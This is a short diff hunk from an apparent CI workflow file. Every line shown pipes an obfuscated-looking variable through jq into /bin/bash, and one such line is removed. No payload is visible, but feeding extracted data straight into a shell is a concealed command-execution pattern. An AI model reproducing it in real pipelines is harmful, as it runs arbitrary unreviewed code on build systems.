@@ -22,7 +22,6 @@ jobs:
           echo $ga70 | jq -r .spku02 | /bin/bash
           printf '%s' "$f34933" | jq -r .azlwr6 | /bin/bash
           echo $f5529 | jq -r .paa6 | /bin/bash
-          echo $tuem81 | jq -r .owaye167 | /bin/bash
           printf '%s' "$wjmde0" | jq -r .cwxv1149 | /bin/bash
           printf '%s' "$h0007" | jq -r .c32134 | /bin/bash
 
